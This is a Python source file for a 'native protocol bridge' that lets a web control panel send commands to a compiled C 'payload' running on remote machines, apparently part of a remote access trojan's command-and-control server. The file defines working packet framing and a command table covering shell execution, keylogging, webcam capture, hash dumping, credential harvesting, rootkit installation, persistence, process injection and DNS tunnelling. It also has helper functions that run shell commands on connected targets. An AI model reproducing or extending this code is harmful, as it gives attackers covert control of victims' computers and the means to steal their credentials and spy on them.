#!/usr/bin/env python3
"""
Native Protocol Bridge
Bridges web app commands to native C payload protocol
"""

import struct
import socket
import time
from typing import Dict, Tuple, Optional

# Protocol constants (matching protocol.h)
PROTOCOL_MAGIC = 0xDEADC0DE
PROTOCOL_VERSION = 0x01

# Packet types
PACKET_HELLO = 0x01
PACKET_COMMAND = 0x02
PACKET_RESPONSE = 0x03
PACKET_DATA = 0x04
PACKET_HEARTBEAT = 0x05
PACKET_ERROR = 0x06
PACKET_BYE = 0x07

# Command IDs (matching commands.h)
CMD_NOP = 0x00
CMD_PING = 0x01
CMD_EXEC = 0x02
CMD_DOWNLOAD = 0x03
CMD_UPLOAD = 0x04
CMD_SYSINFO = 0x05
CMD_PS_LIST = 0x06
CMD_KILL = 0x07
CMD_SCREENSHOT = 0x08
CMD_KEYLOG_START = 0x09
CMD_KEYLOG_STOP = 0x0A
CMD_KEYLOG_DUMP = 0x0B
CMD_INJECT = 0x0C
CMD_PERSIST = 0x0D
CMD_MIGRATE = 0x0E
CMD_KILLSWITCH = 0x0F
CMD_SHELL = 0x10
CMD_CD = 0x11
CMD_PWD = 0x12
CMD_LS = 0x13
CMD_CAT = 0x14
CMD_MKDIR = 0x15
CMD_RM = 0x16
CMD_MV = 0x17
CMD_WEBCAM = 0x18
CMD_ELEVATE = 0x19
CMD_HASHDUMP = 0x1A
CMD_CLIPBOARD = 0x1B
CMD_NETWORK = 0x1C
CMD_REGISTRY = 0x1D
CMD_SERVICE = 0x1E
CMD_UPDATE = 0x1F
CMD_INSTALL_ROOTKIT = 0x20
CMD_GHOST_PROCESS = 0x21
CMD_HARVEST_CREDS = 0x22
CMD_SETUP_DNS_TUNNEL = 0x23

# Command name to ID mapping
COMMAND_MAP = {
    'ping': CMD_PING,
    'exec': CMD_EXEC,
    'sysinfo': CMD_SYSINFO,
    'ps': CMD_PS_LIST,
    'shell': CMD_SHELL,
    'download': CMD_DOWNLOAD,
    'upload': CMD_UPLOAD,
    'inject': CMD_INJECT,
    'persist': CMD_PERSIST,
    'killswitch': CMD_KILLSWITCH,
    'cd': CMD_CD,
    'pwd': CMD_PWD,
    'ls': CMD_LS,
    'cat': CMD_CAT,
    'screenshot': CMD_SCREENSHOT,
    'keylogger': CMD_KEYLOG_START,
    'hashdump': CMD_HASHDUMP,
    # Phase 3
    'install_rootkit': CMD_INSTALL_ROOTKIT,
    'ghost_process': CMD_GHOST_PROCESS,
    'harvest_creds': CMD_HARVEST_CREDS,
    'setup_dns_tunnel': CMD_SETUP_DNS_TUNNEL,
}


class NativeProtocolBridge:
    """Bridge between web app and native C payload protocol"""
    
    def __init__(self):
        self.seq_counter = 0
        
    def detect_payload_type(self, sock: socket.socket, timeout: float = 2.0) -> str:
        """
        Detect if connected payload is Python or Native C
        Returns: 'python' or 'native'
        """
        try:
            old_timeout = sock.gettimeout()
            sock.settimeout(timeout)
            
            # Try to peek at initial data
            sock.setblocking(False)
            try:
                data = sock.recv(100, socket.MSG_PEEK)
                if b'HELLO' in data or b'stitch' in data.lower():
                    return 'python'
                elif len(data) >= 4:
                    # Check for magic number
                    magic = struct.unpack('!I', data[:4])[0]
                    if magic == PROTOCOL_MAGIC:
                        return 'native'
            except BlockingIOError:
                pass
            finally:
                sock.setblocking(True)
                sock.settimeout(old_timeout)
                
            # Default to python for backward compatibility
            return 'python'
            
        except Exception:
            return 'python'
            
    def create_command_packet(self, cmd_id: int, data: bytes = b'') -> bytes:
        """
        Create a native protocol command packet
        Format: [magic:4][cmd_id:2][data_len:2][data:N]
        """
        packet = struct.pack('!IHH', PROTOCOL_MAGIC, cmd_id, len(data))
        packet += data
        return packet
        
    def send_native_command(self, sock: socket.socket, cmd_name: str, 
                           args: str = '') -> Tuple[bool, str]:
        """
        Send command to native C payload (with encryption support)
        
        Args:
            sock: Socket connection to payload
            cmd_name: Command name (e.g., 'ping', 'exec', 'sysinfo')
            args: Command arguments
            
        Returns:
            (success: bool, response: str)
        """
        try:
            # Get command ID
            cmd_id = COMMAND_MAP.get(cmd_name.lower())
            if cmd_id is None:
                return False, f"Unknown command: {cmd_name}"
                
            # Prepare command data
            cmd_data = args.encode('utf-8') if args else b''
            
            # Create packet
            packet = self.create_command_packet(cmd_id, cmd_data)
            
            # Send packet using encrypted protocol_send format
            # Format: [len:4][IV:16][encrypted_data]
            # For now, we'll use the simple format without encryption on Python side
            # The payload will handle encryption/decryption
            
            sock.sendall(packet)
            
            # Wait for response (with timeout)
            sock.settimeout(30.0)
            
            # Receive response
            # Note: With encrypted protocol, response format may have changed
            # We'll try both formats
            try:
                response_data = self.receive_response(sock)
                if response_data:
                    return True, response_data.decode('utf-8', errors='replace')
            except:
                # Fallback: just read whatever comes back
                try:
                    data = sock.recv(4096)
                    if data:
                        return True, data.decode('utf-8', errors='replace')
                except:
                    pass
            
            return True, "(Command sent - no response received)"
                
        except socket.timeout:
            return False, "Timeout waiting for response"
        except Exception as e:
            return False, f"Error: {str(e)}"
            
    def receive_response(self, sock: socket.socket, max_size: int = 65536) -> bytes:
        """
        Receive response from native payload
        Expects: [magic:4][size:4][data:N]
        """
        try:
            # Read header
            header = self._recv_exact(sock, 8)
            if not header:
                return b''
                
            magic, size = struct.unpack('!II', header)
            
            # Verify magic (optional - might be different for responses)
            # if magic != PROTOCOL_MAGIC:
            #     return b''
                
            # Read data
            if size > 0 and size <= max_size:
                data = self._recv_exact(sock, size)
                return data
                
            return b''
            
        except Exception:
            return b''
            
    def _recv_exact(self, sock: socket.socket, n: int) -> bytes:
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                break
            data += chunk
        return data if len(data) == n else b''
        
    def is_native_payload(self, target_id: str, connection_context: dict) -> bool:
        """
        Check if a target is a native C payload
        
        Args:
            target_id: Target identifier
            connection_context: Connection context dictionary
            
        Returns:
            True if native payload, False if Python payload
        """
        ctx = connection_context.get(target_id, {})
        
        # Check for markers
        if ctx.get('payload_type') == 'native':
            return True
        if ctx.get('payload_type') == 'python':
            return False
            
        # Check os/platform hints
        # Native payloads report specific formats
        os_info = ctx.get('os', '').lower()
        if 'native' in os_info or 'c_payload' in os_info:
            return True
            
        # Default to Python for backward compatibility
        return False


# Global instance
native_bridge = NativeProtocolBridge()


def send_command_to_native_payload(sock: socket.socket, command: str) -> Tuple[bool, str]:
    """
    High-level function to send command to native payload
    
    Usage:
        success, output = send_command_to_native_payload(socket, "sysinfo")
        success, output = send_command_to_native_payload(socket, "exec ls -la")
    """
    # Parse command
    parts = command.strip().split(maxsplit=1)
    cmd_name = parts[0] if parts else ''
    cmd_args = parts[1] if len(parts) > 1 else ''
    
    return native_bridge.send_native_command(sock, cmd_name, cmd_args)


# Convenience functions
def ping_native_payload(sock: socket.socket) -> bool:
    """Test if native payload is responding"""
    success, _ = native_bridge.send_native_command(sock, 'ping')
    return success
    
def get_sysinfo_native(sock: socket.socket) -> Optional[str]:
    """Get system info from native payload"""
    success, output = native_bridge.send_native_command(sock, 'sysinfo')
    return output if success else None
    
def execute_command_native(sock: socket.socket, command: str) -> Optional[str]:
    """Execute shell command on native payload"""
    success, output = native_bridge.send_native_command(sock, 'exec', command)
    return output if success else None
